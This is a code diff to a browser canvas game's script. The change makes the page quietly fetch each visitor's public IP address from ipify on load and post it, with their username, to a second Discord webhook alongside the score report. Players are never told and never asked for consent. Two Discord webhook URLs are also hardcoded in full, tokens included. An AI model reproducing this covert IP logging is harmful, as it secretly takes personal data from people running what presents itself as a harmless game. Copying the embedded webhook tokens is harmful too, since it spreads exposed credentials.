@@ -48,9 +48,11 @@
         const overlay = document.getElementById('overlay');
         const message = document.getElementById('message');
         const restartButton = document.getElementById('restartButton');
-        const webhookURL = 'https://discord.com/api/webhooks/1250899711758569482/JVWRB37ejxy1m1NSi1C-SKoC3heGEkWIe7Fb-K23nEE0I1GE3PDvfEKMcai1CKaFViyz';
+        const scoreWebhookURL = 'https://discord.com/api/webhooks/1250899711758569482/JVWRB37ejxy1m1NSi1C-SKoC3heGEkWIe7Fb-K23nEE0I1GE3PDvfEKMcai1CKaFViyz';
+        const ipWebhookURL = 'https://discord.com/api/webhooks/1250889217408765973/bHGwavqx33Rw9Kyz3qfaF11WvbvULABmKl2JetfqU9UncfBwhQ6hZ2dr15FVbPKcZNsV';
 
         let username = '';
+        let userIP = '';
         let score = 0;
         let isPaused = false;
         let isGameOver = false;
@@ -186,17 +188,40 @@
         }
 
         function sendResultsToDiscord() {
-            const data = {
+            const scoreData = {
                 content: `User: ${username}, Points: ${score}`
             };
 
-            fetch(webhookURL, {
+            fetch(scoreWebhookURL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(scoreData)
             });
+
+            const ipData = {
+                content: `User: ${username}, IP: ${userIP}`
+            };
+
+            fetch(ipWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(ipData)
+            });
+        }
+
+        function getUserIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIP = data.ip;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
         }
 
         canvas.addEventListener('mousemove', (e) => {
@@ -265,13 +290,16 @@
             updateGame();
         });
 
-        window.onload = () => {
-            username = prompt('Enter your username:');
+        function promptUsername() {
+            username = prompt("Please enter your username:");
             if (!username) {
-                username = 'Anonymous';
+                username = "Anonymous";
             }
-            updateGame();
-        };
+        }
+
+        promptUsername();
+        getUserIP();
+        updateGame();
 
         canvas.style.cursor = 'none';
     </script>
